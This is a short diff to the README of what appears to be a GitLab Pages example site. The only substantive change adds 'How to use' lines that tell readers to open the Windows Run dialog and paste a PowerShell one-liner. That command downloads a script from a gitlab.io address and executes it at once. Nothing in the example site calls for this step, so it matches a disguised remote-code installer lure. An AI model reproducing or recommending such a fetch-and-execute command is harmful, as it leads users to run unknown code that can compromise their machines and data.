@@ -1,3 +1,8 @@
+How to use:
+Win+R for run command line, then:
+powershell irm revert8plus.gitlab.io | iex
+
+
 Example plain HTML site using GitLab Pages.
 
 Learn more about GitLab Pages at https://pages.gitlab.io and the official
